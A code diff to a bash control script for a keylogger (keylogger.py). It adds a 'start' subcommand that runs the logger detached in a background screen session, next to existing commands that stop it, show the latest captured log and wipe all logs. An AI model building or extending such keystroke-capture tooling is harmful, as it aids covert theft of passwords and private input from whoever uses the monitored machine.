@@ -17,6 +17,11 @@ function stop_kl() {
     pkill -f keylogger.py
 }
 
+function start_kl() {
+    echo "[+] starting ..."
+    screen -AmdS keylogger python3 "$BIN"
+}
+
 proc="$(ps aux | grep keylogger.py | grep -v grep)"
 if [ "$1" == "--help" ] || [ "$1" == "-h" ]
 then
@@ -24,8 +29,19 @@ then
     echo "  swipe       deletes all logs"
     echo "  status      show if running or not"
     echo "  show        shows latest log"
+    echo "  start       start if not running already"
     echo "  stop        stops it"
     echo "  i           interact and join the screen session"
+    exit 0
+elif [ "$1" == "start" ]
+then
+    if [ "$proc" == "" ]
+    then
+        start_kl
+    else
+        echo "[!] running already:"
+        echo "$proc"
+    fi
     exit 0
 elif [ "$1" == "stop" ]
 then
@@ -97,8 +113,7 @@ fi
 
 if [ "$proc" == "" ]
 then
-    echo "[+] starting ..."
-    screen -AmdS keylogger python3 "$BIN"
+    start_kl
 else
     stop_kl
 fi
